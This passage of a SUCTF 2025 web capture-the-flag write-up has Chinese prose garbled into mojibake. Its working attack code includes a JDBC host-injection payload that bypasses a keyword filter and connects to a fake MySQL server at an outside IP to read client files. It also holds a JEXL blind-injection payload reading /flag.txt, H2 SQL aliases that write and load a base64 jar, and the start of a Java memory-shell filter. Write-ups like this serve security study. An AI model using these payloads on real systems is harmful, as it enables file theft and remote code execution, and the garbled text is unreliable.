class="hljs-type">String</span> <span class="hljs-variable">MYSQL_SECURITY_CHECK_ENABLE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">MYSQL_CONNECT_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://%s:%s/%s&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_MYSQL_PROTOCOL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_MATCH_REGEX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;(?i)jdbc:(?i)(mysql)://([^:]+)(:[0-9]+)?(/[a-zA-Z0-9_-]*[\\.\\-]?)?&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">MYSQL_SENSITIVE_PARAMS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;allowLoadLocalInfile,autoDeserialize,allowLocalInfile,allowUrlInLocalInfile,#&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkJdbcConnParams</span><span class="hljs-params">(String str, Integer num, String str2, String str3, String str4, Map&lt;String, Object&gt; map)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (Boolean.valueOf(MYSQL_SECURITY_CHECK_ENABLE).booleanValue()) &#123;<br>            <span class="hljs-keyword">if</span> (StringUtils.isAnyBlank(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CharSequence</span>[]&#123;str, str2&#125;)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Invalid mysql connection params.&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">format</span> <span class="hljs-operator">=</span> String.format(MYSQL_CONNECT_URL, str.trim(), num, str4.trim());<br>            checkHost(str.trim());<br>            checkUrl(format);<br>            checkParams(map);<br>            checkUrlIsSafe(format);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkHost</span><span class="hljs-params">(String str)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (str == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (str.startsWith(<span class="hljs-string">&quot;(&quot;</span>) || str.endsWith(<span class="hljs-string">&quot;)&quot;</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Invalid host&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkUrl</span><span class="hljs-params">(String str)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> ((str == <span class="hljs-literal">null</span> || str.toLowerCase().startsWith(JDBC_MYSQL_PROTOCOL)) &amp;&amp; !Pattern.compile(JDBC_MATCH_REGEX).matcher(str).matches()) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, Object&gt; <span class="hljs-title function_">parseMysqlUrlParamsToMap</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">if</span> (StringUtils.isBlank(str)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        &#125;<br>        String[] split = str.split(AND_SYMBOL);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(split.length);<br>        <span class="hljs-keyword">for</span> (String str2 : split) &#123;<br>            String[] split2 = str2.split(EQUAL_SIGN);<br>            <span class="hljs-keyword">if</span> (split2.length == <span class="hljs-number">2</span>) &#123;<br>                hashMap.put(split2[<span class="hljs-number">0</span>], split2[<span class="hljs-number">1</span>]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">parseParamsMapToMysqlParamUrl</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> &#123;<br>        <span class="hljs-keyword">return</span> (map == <span class="hljs-literal">null</span> || map.isEmpty()) ? <span class="hljs-string">&quot;&quot;</span> : (String) map.entrySet().stream().map(entry -&gt; &#123;<br>            <span class="hljs-keyword">return</span> String.join(EQUAL_SIGN, (CharSequence) entry.getKey(), String.valueOf(entry.getValue()));<br>        &#125;).collect(Collectors.joining(AND_SYMBOL));<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkParams</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (map == <span class="hljs-literal">null</span> || map.isEmpty()) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Map&lt;String, Object&gt; parseMysqlUrlParamsToMap = parseMysqlUrlParamsToMap(URLDecoder.decode(parseParamsMapToMysqlParamUrl(map), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>            map.clear();<br>            map.putAll(parseMysqlUrlParamsToMap);<br>            Iterator&lt;Map.Entry&lt;String, Object&gt;&gt; it = map.entrySet().iterator();<br>            <span class="hljs-keyword">while</span> (it.hasNext()) &#123;<br>                Map.Entry&lt;String, Object&gt; next = it.next();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> next.getKey();<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> next.getValue();<br>                <span class="hljs-keyword">if</span> (StringUtils.isBlank(key) || value == <span class="hljs-literal">null</span> || StringUtils.isBlank(value.toString())) &#123;<br>                    it.remove();<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isNotSecurity(key, value.toString())) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Invalid mysql connection parameters: &quot;</span> + parseParamsMapToMysqlParamUrl(map));<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (UnsupportedEncodingException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;mysql connection cul decode error: &quot;</span> + e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNotSecurity</span><span class="hljs-params">(String str, String str2)</span> &#123;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">z</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str3</span> <span class="hljs-operator">=</span> MYSQL_SENSITIVE_PARAMS;<br>        <span class="hljs-keyword">if</span> (StringUtils.isBlank(str3)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        String[] split = str3.split(COMMA);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> split.length;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">if</span> (i &gt;= length) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isNotSecurity(str, str2, split[i])) &#123;<br>                z = <span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                i++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> !z;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNotSecurity</span><span class="hljs-params">(String str, String str2, String str3)</span> &#123;<br>        <span class="hljs-keyword">return</span> str.toLowerCase().contains(str3.toLowerCase()) || str2.toLowerCase().contains(str3.toLowerCase());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkUrlIsSafe</span><span class="hljs-params">(String str)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> Pattern.compile(BLACKLIST_REGEX).matcher(str.toLowerCase());<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-keyword">while</span> (matcher.find()) &#123;<br>                <span class="hljs-keyword">if</span> (sb.length() &gt; <span class="hljs-number">0</span>) &#123;<br>                    sb.append(<span class="hljs-string">&quot;, &quot;</span>);<br>                &#125;<br>                sb.append(matcher.group());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (sb.length() &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;url contains blacklisted characters: &quot;</span> + ((Object) sb));<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;error occurred during url security check: &quot;</span> + e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">appendMysqlForceParams</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> &#123;<br>        map.putAll(parseMysqlUrlParamsToMap(<span class="hljs-string">&quot;allowLoadLocalInfile=false&amp;autoDeserialize=false&amp;allowLocalInfile=false&amp;allowUrlInLocalInfile=false&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ä¸€ä¸ªæ­£å¸¸æ‰“JDBCè¯»æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/jdbc<br></code></pre></td></tr></table></figure><p>æç¤ºäº† reason: not valid java name and contains not printable characters</p><p>æ£€æŸ¥é€»è¾‘åå¯ä»¥å‘ç° host å­—æ®µçš„æ­£åˆ™ Reg å¯ä»¥è¿›è¡Œæ³¨å…¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;(?i)jdbc:(?i)(mysql)://([^:]+)(:[0-9]+)?(/[a-zA-Z0-9_-]*[\\.\\-]?)?&quot;</span>;<br></code></pre></td></tr></table></figure><ul><li><code>([^:]+)</code> å¯ä»¥ä¸€ç›´åŒ¹é…æ‰€æœ‰éå†’å·å­—ç¬¦ä¸²</li><li>é€šè¿‡ url å…¨å­—ç¬¦ç¼–ç å¯ä»¥ç»•è¿‡å…³é”®è¯åŒ¹é…waf</li><li>å¯ä»¥ä½¿ç”¨ # æ¥å¿½ç•¥æœ€åæ’å…¥çš„å®‰å…¨ç­–ç•¥</li></ul><p>æŒ‰ç…§ä¸Šè¿°æè¿°å°†ä¸‹åˆ—å­—æ®µæ³¨å…¥åˆ°hostä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">allowLoadLocalInfile=<span class="hljs-literal">true</span>&amp;allowUrlInLocalInfile=<span class="hljs-literal">true</span>&amp;allowLoadLocalInfileInPath=/&amp;maxAllowedPacket=<span class="hljs-number">655360</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨MySQL_Fake_Serverè¯»å–å®¢æˆ·ç«¯æ–‡ä»¶å°±å‡ºäº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">host=ADDRESS=(host=<span class="hljs-number">8.140</span><span class="hljs-number">.251</span><span class="hljs-number">.152</span>)(port=<span class="hljs-number">3306</span>)(database=test)(user=fileread_file%3A%<span class="hljs-number">2F</span>%<span class="hljs-number">2F</span>%<span class="hljs-number">2F</span>.)(%<span class="hljs-number">61</span>%6c%6c%<span class="hljs-number">6f</span>%<span class="hljs-number">77</span>%4c%<span class="hljs-number">6f</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%4c%<span class="hljs-number">6f</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%6c%<span class="hljs-number">49</span>%6e%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%6c%<span class="hljs-number">65</span>=<span class="hljs-literal">true</span>)(%<span class="hljs-number">61</span>%6c%6c%<span class="hljs-number">6f</span>%<span class="hljs-number">77</span>%4c%<span class="hljs-number">6f</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%4c%<span class="hljs-number">6f</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%6c%<span class="hljs-number">49</span>%6e%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%6c%<span class="hljs-number">65</span>%<span class="hljs-number">49</span>%6e%<span class="hljs-number">50</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">68</span>=%<span class="hljs-number">2F</span>)(%<span class="hljs-number">61</span>%6c%6c%<span class="hljs-number">6f</span>%<span class="hljs-number">77</span>%<span class="hljs-number">55</span>%<span class="hljs-number">72</span>%6c%<span class="hljs-number">49</span>%6e%4c%<span class="hljs-number">6f</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%6c%<span class="hljs-number">49</span>%6e%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%6c%<span class="hljs-number">65</span>=<span class="hljs-literal">true</span>)(%<span class="hljs-number">6d</span>%<span class="hljs-number">61</span>%<span class="hljs-number">78</span>%<span class="hljs-number">41</span>%6c%6c%<span class="hljs-number">6f</span>%<span class="hljs-number">77</span>%<span class="hljs-number">65</span>%<span class="hljs-number">64</span>%<span class="hljs-number">50</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%6b%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>=<span class="hljs-number">655360</span>)  #/test&amp;port=<span class="hljs-number">3306</span>&amp;database=test&amp;extraParams=&#123;&#125;&amp;username=test&amp;password=root<br></code></pre></td></tr></table></figure><p>æ¬§é˜³å­¦é•¿è¿˜è¯´ä¼šè‡ªåŠ¨ä¸¤æ¬¡URLè§£ç ï¼Œä¹Ÿèƒ½ç›´æ¥æ‰“ã€‚</p><p>ï¼ˆæœ¬åœ°ç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œå°±ä¸æ¼”ç¤ºäº†xxxxï¼‰</p><h2 id="SU-ez-micronaut"><a href="#SU-ez-micronaut" class="headerlink" title="SU_ez_micronaut"></a>SU_ez_micronaut</h2><p>æ¬§é˜³å­¦é•¿å’Œèµµå“¥é ç€ç›²æ³¨å†æ¬¡æ‹¿ä¸‹ï¼Œtqlã€‚</p><p>è¿™é‡Œä¿æŠ¤ä¸€ä¸‹ç‰ˆæƒå°±ä¸æ”¾å®Œæ•´expäº†ï¼Œå…³é”®å°±æ˜¯ä½¿ç”¨äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">f&quot;&quot;&quot;eyIxIjoiMSJ9&lt;---&gt;new(&#x27;cn.hutool.extra.expression.engine.jexl.JexlEngine&#x27;).eval(&quot;if(new(&#x27;cn.hutool.core.io.FileUtil&#x27;).readUtf8String(new(&#x27;cn.hutool.core.io.FileUtil&#x27;).file(&#x27;/flag.txt&#x27;)).charAt(<span class="hljs-subst">&#123;j&#125;</span>)==<span class="hljs-subst">&#123;i&#125;</span>)&#123;&#123;new(&#x27;java.lang.Thread&#x27;).sleep(5000);&#125;&#125;&quot;,null)&lt;---&gt;admin&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>æ¥è¿›è¡Œé€å­—èŠ‚ç›²æ³¨ï¼š</p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250120185719395.png" class="" title="image-20250120185719395"><p>è¿™é“é¢˜å®˜æ–¹wpå†™çš„å¾ˆç²¾å½©ï¼Œç†è§£èµ·æ¥ä¹Ÿæœ‰ç‚¹å°éš¾åº¦ï¼Œå¤ç°ä¹Ÿæœ‰ç‚¹éš¾ç»·emmmã€‚ã€‚ã€‚</p><p>è¯¦è§ï¼š<a href="https://www.yuque.com/yulate/sd2qe4/af7s0tsqlccm5ipe#f7fc871b">ez-micronaut</a></p><p>é‡Œé¢è¿˜æœ‰micronautå†…å­˜é©¬æŒ–æ˜çš„æ€è·¯ã€‚</p><p>å†…å­˜é©¬åšå¥½ä¹‹åï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ€è·¯ï¼Œç¬¬ä¸€ç§æ˜¯ç›´æ¥å°†æ³¨å…¥å†…å­˜é©¬çš„ä»£ç æŒ‰ç…§h2 sqlçš„è¯­æ³•è¿›è¡Œç¼–ç è½¬æ¢æ‰§è¡Œï¼Œä½†æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œéœ€è¦å°†importçš„ç±»éƒ½å†™æˆå…¨ç±»åè¿›è¡Œä½¿ç”¨ã€‚</p><p>ç¬¬äºŒç§å°†jaråŒ…è¯»å–ä¸ºäºŒè¿›åˆ¶æµå†base64å†™åˆ°æœåŠ¡å™¨ï¼Œå†ä½¿ç”¨loadClassåŠ è½½ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- Step 1: åˆ›å»ºBase64è§£ç å’Œæ–‡ä»¶å†™å…¥çš„ALIAS</span><br><span class="hljs-keyword">CREATE</span> ALIAS IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> BASE64_TO_JAR <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">void base64ToJar(String base64Data, String filePath) throws java.io.IOException &#123;</span><br><span class="hljs-string">    byte[] jarBytes = java.util.Base64.getDecoder().decode(base64Data);</span><br><span class="hljs-string">    try (java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath)) &#123;</span><br><span class="hljs-string">        fos.write(jarBytes);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;</span>;<br><br><span class="hljs-comment">-- Step 2: åˆ›å»ºåŠ è½½JARå¹¶æ‰§è¡Œæ–¹æ³•çš„ALIAS</span><br><span class="hljs-keyword">CREATE</span> ALIAS IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> LOAD_JAR <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">void loadJar(String jarPath, String className, String methodName) throws Exception &#123;</span><br><span class="hljs-string">    java.net.URL jarUrl = new java.net.URL(&quot;file:&quot; + jarPath);</span><br><span class="hljs-string">    java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]&#123;jarUrl&#125;);</span><br><span class="hljs-string">    Class&lt;?&gt; loadedClass = classLoader.loadClass(className);</span><br><span class="hljs-string">    Object instance = loadedClass.getDeclaredConstructor().newInstance();</span><br><span class="hljs-string">    java.lang.reflect.Method method = loadedClass.getMethod(methodName);</span><br><span class="hljs-string">    method.invoke(instance);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;</span>;<br><br><span class="hljs-comment">-- Step 3: æ‰§è¡ŒBase64è§£ç å¹¶å†™å…¥JARæ–‡ä»¶</span><br><span class="hljs-keyword">CALL</span> BASE64_TO_JAR(<span class="hljs-string">&#x27;ä½ çš„base64æ•°æ®&#x27;</span>, <span class="hljs-string">&#x27;yourfile.jar&#x27;</span>);<br><br><span class="hljs-comment">-- Step 4: åŠ è½½JARå¹¶æ‰§è¡Œæ–¹æ³•</span><br><span class="hljs-keyword">CALL</span> LOAD_JAR(<span class="hljs-string">&#x27;yourfile.jar&#x27;</span>, <span class="hljs-string">&#x27;com.example.YourClass&#x27;</span>, <span class="hljs-string">&#x27;executeMethod&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> micronaut.poc;<br><br><span class="hljs-keyword">import</span> io.micronaut.core.propagation.PropagatedContextElement;<br><span class="hljs-keyword">import</span> io.micronaut.core.util.SupplierUtil;<br><span class="hljs-keyword">import</span> io.micronaut.http.HttpRequest;<br><span class="hljs-keyword">import</span> io.micronaut.http.MutableHttpResponse;<br><span class="hljs-keyword">import</span> io.micronaut.http.filter.*;<br><span class="hljs-keyword">import</span> io.micronaut.http.server.RouteExecutor;<br><span class="hljs-keyword">import</span> io.micronaut.http.server.netty.NettyHttpRequest;<br><span class="hljs-keyword">import</span> io.micronaut.web.router.DefaultRouter;<br><span class="hljs-keyword">import</span> io.netty.util.internal.InternalThreadLocalMap;<br><span class="hljs-keyword">import</span> org.reactivestreams.Publisher;<br><span class="hljs-keyword">import</span> reactor.core.publisher.Flux;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> java.util.function.Supplier;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilFilter</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hacked</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// è·å–Unsafeå®ä¾‹</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            unsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) unsafeField.get(<span class="hljs-literal">null</span>);<br><br>            <span class="hljs-comment">// è·å–å½“å‰çº¿ç¨‹ (å‡è®¾çº¿ç¨‹ç±»å‹æ˜¯NettyThreadFactory$NonBlockingFastThreadLocalThread)</span><br>            <span class="hljs-type">Thread</span> <span class="hljs-variable">currentThread</span> <span class="hljs-operator">=</span> Thread.currentThread();<br><br>            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯Nettyçš„çº¿ç¨‹ç±»å‹</span><br>            <span class="hljs-keyword">if</span> (currentThread.getClass().getName().contains(<span class="hljs-string">&quot;NettyThreadFactory$NonBlockingFastThreadLocalThread&quot;</span>)) &#123;<br>                <span class="hljs-comment">// è·å–threadLocalMapå­—æ®µçš„åç§»é‡</span><br>                <span class="hljs-type">Field</span> <span class="hljs-variable">threadLocalMapField</span> <span class="hljs-operator">=</span> currentThread.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;threadLocalMap&quot;</span>);<br>                <span class="hljs-type">long</span> <span class="hljs-variable">threadLocalMapOffset</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(threadLocalMapField);<br><br>                <span class="hljs-comment">// ä½¿ç”¨Unsafeè·å–threadLocalMapå­—æ®µçš„å€¼</span><br>                <span 